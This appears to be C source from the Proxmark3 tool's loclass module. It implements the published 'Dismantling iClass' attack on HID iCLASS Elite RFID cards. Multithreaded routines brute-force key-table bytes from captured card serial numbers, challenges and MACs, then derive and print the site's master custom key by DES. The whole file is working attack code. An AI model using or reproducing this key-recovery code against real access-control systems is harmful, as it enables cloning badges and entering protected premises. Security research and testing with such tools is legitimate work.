//-----------------------------------------------------------------------------
// Borrowed initially from https://github.com/holiman/loclass
// Copyright (C) 2014 Martin Holst Swende
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// WARNING
//
// THIS CODE IS CREATED FOR EXPERIMENTATION AND EDUCATIONAL USE ONLY.
//
// USAGE OF THIS CODE IN OTHER WAYS MAY INFRINGE UPON THE INTELLECTUAL
// PROPERTY OF OTHER PARTIES, SUCH AS INSIDE SECURE AND HID GLOBAL,
// AND MAY EXPOSE YOU TO AN INFRINGEMENT ACTION FROM THOSE PARTIES.
//
// THIS CODE SHOULD NEVER BE USED TO INFRINGE PATENTS OR INTELLECTUAL PROPERTY RIGHTS.
//-----------------------------------------------------------------------------
// It is a reconstruction of the cipher engine used in iClass, and RFID techology.
//
// The implementation is based on the work performed by
// Flavio D. Garcia, Gerhard de Koning Gans, Roel Verdult and
// Milosch Meriac in the paper "Dismantling IClass".
//-----------------------------------------------------------------------------
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <pthread.h>
#include <time.h>
#include <mbedtls/des.h>
#include "optimized_cipherutils.h"
#include "optimized_cipher.h"
#include "optimized_ikeys.h"
#include "elite_crack.h"
#include "pm3.h"

typedef struct {
    int thread_idx;
    uint32_t endmask;
    uint8_t numbytes_to_recover;
    uint8_t bytes_to_recover[3];
    uint8_t key_index[8];
    uint16_t keytable[128];
    loclass_dumpdata_t item;
} loclass_thread_arg_t;

typedef struct {
    uint8_t values[3];
} loclass_thread_ret_t;

static size_t loclass_tc = 1;
static int loclass_found = 0;

static void *bf_thread(void *thread_arg) {

    loclass_thread_arg_t *targ = (loclass_thread_arg_t *)thread_arg;
    const uint32_t endmask = targ->endmask;
    const uint8_t numbytes_to_recover = targ->numbytes_to_recover;
    uint32_t brute = targ->thread_idx;

    uint8_t csn[8];
    uint8_t cc_nr[12];
    uint8_t mac[4];
    uint8_t key_index[8];
    uint8_t bytes_to_recover[3];
    uint16_t keytable[128];

    memcpy(csn, targ->item.csn, sizeof(csn));
    memcpy(cc_nr, targ->item.cc_nr, sizeof(cc_nr));
    memcpy(mac, targ->item.mac, sizeof(mac));
    memcpy(key_index, targ->key_index, sizeof(key_index));
    memcpy(bytes_to_recover, targ->bytes_to_recover, sizeof(bytes_to_recover));
    memcpy(keytable, targ->keytable, sizeof(keytable));

    while (!(brute & endmask)) {

        int found = __atomic_load_n(&loclass_found, __ATOMIC_SEQ_CST);

        if (found != 0xFF) return NULL;

        //Update the keytable with the brute-values
        for (uint8_t i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]] &= 0xFF00;
            keytable[bytes_to_recover[i]] |= (brute >> (i * 8) & 0xFF);
        }

        uint8_t key_sel[8] = {0};

        // Piece together the key
        key_sel[0] = keytable[key_index[0]] & 0xFF;
        key_sel[1] = keytable[key_index[1]] & 0xFF;
        key_sel[2] = keytable[key_index[2]] & 0xFF;
        key_sel[3] = keytable[key_index[3]] & 0xFF;
        key_sel[4] = keytable[key_index[4]] & 0xFF;
        key_sel[5] = keytable[key_index[5]] & 0xFF;
        key_sel[6] = keytable[key_index[6]] & 0xFF;
        key_sel[7] = keytable[key_index[7]] & 0xFF;

        // Permute from iclass format to standard format

        uint8_t key_sel_p[8] = {0};
        permutekey_rev(key_sel, key_sel_p);

        // Diversify
        uint8_t div_key[8] = {0};
        diversifyKey(csn, key_sel_p, div_key);

        // Calc mac
        uint8_t calculated_MAC[4] = {0};
        doMAC(cc_nr, div_key, calculated_MAC);

        // success
        if (memcmp(calculated_MAC, mac, 4) == 0) {

            loclass_thread_ret_t *r = (loclass_thread_ret_t *)malloc(sizeof(loclass_thread_ret_t));

            for (uint8_t i = 0 ; i < numbytes_to_recover; i++) {
                r->values[i] = keytable[bytes_to_recover[i]] & 0xFF;
            }
            __atomic_store_n(&loclass_found, targ->thread_idx, __ATOMIC_SEQ_CST);
            pthread_exit((void *)r);
        }

        brute += loclass_tc;

#define _CLR_ "\x1b[0K"

        if (numbytes_to_recover == 3) {
            if ((brute > 0) && ((brute & 0xFFFF) == 0)) {
                // PrintAndLogEx(INPLACE, "[ %02x %02x %02x ] %8u / %u", bytes_to_recover[0], bytes_to_recover[1], bytes_to_recover[2], brute, 0xFFFFFF);
            }
        } else if (numbytes_to_recover == 2) {
            if ((brute > 0) && ((brute & 0x3F) == 0)) {
                // PrintAndLogEx(INPLACE, "[ %02x %02x ] %5u / %u" _CLR_, bytes_to_recover[0], bytes_to_recover[1], brute, 0xFFFF);
            }
        } else {
            if ((brute > 0) && ((brute & 0x1F) == 0)) {
                // PrintAndLogEx(INPLACE, "[ %02x ] %3u / %u" _CLR_, bytes_to_recover[0], brute, 0xFF);
            }
        }
    }
    pthread_exit(NULL);

    void *dummyptr = NULL;
    return dummyptr;
}

int bruteforceItem(loclass_dumpdata_t item, uint16_t keytable[]) {

    // reset thread signals
    loclass_found = 0xFF;

    //Get the key index (hash1)
    uint8_t key_index[8] = {0};
    hash1(item.csn, key_index);

    /*
     * Determine which bytes to retrieve. A hash is typically
     * 01010000454501
     * We go through that hash, and in the corresponding keytable, we put markers
     * on what state that particular index is:
     * - CRACKED (this has already been cracked)
     * - BEING_CRACKED (this is being bruteforced now)
     * - CRACK_FAILED (self-explaining...)
     *
     * The markers are placed in the high area of the 16 bit key-table.
     * Only the lower eight bits correspond to the (hopefully cracked) key-value.
     **/
    uint8_t bytes_to_recover[3] = {0};
    uint8_t numbytes_to_recover = 0;
    for (uint8_t i = 0; i < 8; i++) {
        if (keytable[key_index[i]] & (LOCLASS_CRACKED | LOCLASS_BEING_CRACKED)) continue;

        bytes_to_recover[numbytes_to_recover++] = key_index[i];
        keytable[key_index[i]] |= LOCLASS_BEING_CRACKED;

        if (numbytes_to_recover > 3) {
            PrintAndLogEx(FAILED, "The CSN requires > 3 byte bruteforce, not supported");
            //PrintAndLogEx(INFO, "CSN   %s", sprint_hex(item.csn, 8));
            //PrintAndLogEx(INFO, "HASH1 %s", sprint_hex(key_index, 8));
            PrintAndLogEx(NORMAL, "");
            //Before we exit, reset the 'BEING_CRACKED' to zero
            keytable[bytes_to_recover[0]]  &= ~LOCLASS_BEING_CRACKED;
            keytable[bytes_to_recover[1]]  &= ~LOCLASS_BEING_CRACKED;
            keytable[bytes_to_recover[2]]  &= ~LOCLASS_BEING_CRACKED;
            return PM3_ESOFT;
        }
    }

    if (numbytes_to_recover == 0) {
        PrintAndLogEx(INFO, "No bytes to recover, exiting");
        return PM3_ESOFT;
    }

    loclass_thread_arg_t args[loclass_tc];
    // init thread arguments
    for (size_t i = 0; i < loclass_tc; i++) {
        args[i].thread_idx = i;
        args[i].numbytes_to_recover = numbytes_to_recover;
        args[i].endmask = 1 << 8 * numbytes_to_recover;

        memcpy((void *)&args[i].item, (void *)&item, sizeof(loclass_dumpdata_t));
        memcpy(args[i].bytes_to_recover, bytes_to_recover, sizeof(args[i].bytes_to_recover));
        memcpy(args[i].key_index, key_index, sizeof(args[i].key_index));
        memcpy(args[i].keytable, keytable, sizeof(args[i].keytable));
    }

    pthread_t threads[loclass_tc];
    // create threads
    for (size_t i = 0; i < loclass_tc; i++) {
        int res = pthread_create(&threads[i], NULL, bf_thread, (void *)&args[i]);
        if (res) {
            PrintAndLogEx(NORMAL, "");
            PrintAndLogEx(WARNING, "Failed to create pthreads. Quitting");
            return PM3_ESOFT;
        }
    }
    // wait for threads to terminate:
    void *ptrs[loclass_tc];
    for (size_t i = 0; i < loclass_tc; i++)
        pthread_join(threads[i], &ptrs[i]);

    // was it a success?
    int res = PM3_SUCCESS;
    if (loclass_found == 0xFF) {
        res = PM3_ESOFT;
        PrintAndLogEx(NORMAL, "");
        PrintAndLogEx(WARNING, "Failed to recover %d bytes using the following CSN", numbytes_to_recover);
        //PrintAndLogEx(INFO, "CSN  %s", sprint_hex(item.csn, 8));

        //Before we exit, reset the 'BEING_CRACKED' to zero
        for (uint8_t i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]] &= 0xFF;
            keytable[bytes_to_recover[i]] |= LOCLASS_CRACK_FAILED;
        }

    } else {
        loclass_thread_ret_t ice = *((loclass_thread_ret_t *)ptrs[loclass_found]);

        for (uint8_t i = 0; i < numbytes_to_recover; i++) {
            keytable[bytes_to_recover[i]] = ice.values[i];
            keytable[bytes_to_recover[i]] &= 0xFF;
            keytable[bytes_to_recover[i]] |= LOCLASS_CRACKED;
        }
        for (uint8_t i = 0; i < loclass_tc; i++) {
            free(ptrs[i]);
        }
    }

    memset(args, 0x00, sizeof(args));
    memset(threads, 0x00, sizeof(threads));
    return res;
}

/**
 * From dismantling iclass-paper:
 *  Assume that an adversary somehow learns the first 16 bytes of hash2(K_cus ), i.e., y [0] and z [0] .
 *  Then he can simply recover the master custom key K_cus by computing
 *  K_cus = ~DES(z[0] , y[0] ) .
 *
 *  Furthermore, the adversary is able to verify that he has the correct K cus by
 *  checking whether z [0] = DES enc (K_cus , ~K_cus ).
 * @param keytable an array (128 bytes) of hash2(kcus)
 * @param master_key where to put the master key
 * @return 0 for ok, 1 for failz
 */
int calculateMasterKey(uint8_t first16bytes[], uint8_t kcus[]) {
    mbedtls_des_context ctx_e;

    uint8_t z_0[8] = {0};
    uint8_t y_0[8] = {0};
    uint8_t z_0_rev[8] = {0};
    uint8_t key64[8] = {0};
    uint8_t key64_negated[8] = {0};
    uint8_t result[8] = {0};

    // y_0 and z_0 are the first 16 bytes of the keytable
    memcpy(y_0, first16bytes, 8);
    memcpy(z_0, first16bytes + 8, 8);

    // Our DES-implementation uses the standard NIST
    // format for keys, thus must translate from iclass
    // format to NIST-format
    permutekey_rev(z_0, z_0_rev);

    // ~K_cus = DESenc(z[0], y[0])
    mbedtls_des_setkey_enc(&ctx_e, z_0_rev);
    mbedtls_des_crypt_ecb(&ctx_e, y_0, key64_negated);

    key64[0] = ~key64_negated[0];
    key64[1] = ~key64_negated[1];
    key64[2] = ~key64_negated[2];
    key64[3] = ~key64_negated[3];
    key64[4] = ~key64_negated[4];
    key64[5] = ~key64_negated[5];
    key64[6] = ~key64_negated[6];
    key64[7] = ~key64_negated[7];

    // Can we verify that the  key is correct?
    // Once again, key is on iclass-format
    uint8_t key64_stdformat[8] = {0};
    permutekey_rev(key64, key64_stdformat);

    mbedtls_des_setkey_enc(&ctx_e, key64_stdformat);
    mbedtls_des_crypt_ecb(&ctx_e, key64_negated, result);

    if (kcus != NULL)
        memcpy(kcus, key64, 8);

    if (memcmp(z_0, result, 4) != 0) {
        //PrintAndLogEx(WARNING, _RED_("Failed to verify") " calculated master key (k_cus)! Something is wrong.");
        return PM3_ESOFT;
    }

    //PrintAndLogEx(SUCCESS, "-----  " _CYAN_("High security custom key (Kcus)") " -----");
    PrintAndLogEx(SUCCESS, "Standard format  %s", sprint_hex(key64_stdformat, 8));
    PrintAndLogEx(SUCCESS, "iCLASS format    %s", sprint_hex(key64, 8));
    //PrintAndLogEx(SUCCESS, "Key verified (" _GREEN_("ok") ")");
    PrintAndLogEx(NORMAL, "");
    return PM3_SUCCESS;
}
/**
 * @brief Same as bruteforcefile, but uses a an array of dumpdata instead
 * @param dump
 * @param dumpsize
 * @param keytable
 * @return
 */
int bruteforceDump(uint8_t dump[], size_t dumpsize, uint16_t keytable[]) {
    uint8_t i;
    size_t itemsize = sizeof(loclass_dumpdata_t);
    loclass_dumpdata_t *attack = (loclass_dumpdata_t *) calloc(itemsize, sizeof(uint8_t));
    if (attack == NULL) {
        PrintAndLogEx(WARNING, "failed to allocate memory");
        return PM3_EMALLOC;
    }

    loclass_tc = 1; //num_CPUs();
    //PrintAndLogEx(INFO, "bruteforce using " _YELLOW_("%zu") " threads", loclass_tc);

    int res = 0;

    for (i = 0 ; i * itemsize < dumpsize ; i++) {
        memcpy(attack, dump + i * itemsize, itemsize);
        res = bruteforceItem(*attack, keytable);
        if (res != PM3_SUCCESS)
            break;
    }
    free(attack);

    if (res != PM3_SUCCESS) {
        //PrintAndLogEx(ERR, "loclass exiting. Try run " _YELLOW_("`hf iclass sim -t 2`") " again and collect new data");
        return PM3_ESOFT;
    }

    // Pick out the first 16 bytes of the keytable.
    // The keytable is now in 16-bit ints, where the upper 8 bits
    // indicate crack-status. Those must be discarded for the
    // master key calculation
    uint8_t first16bytes[16] = {0};
    for (i = 0 ; i < 16 ; i++) {
        first16bytes[i] = keytable[i] & 0xFF;

        if ((keytable[i] & LOCLASS_CRACKED) != LOCLASS_CRACKED) {
            PrintAndLogEx(WARNING, "Warning: we are missing byte %d, custom key calculation will fail...", i);
            return PM3_ESOFT;
        }
    }
    return calculateMasterKey(first16bytes, NULL);
}
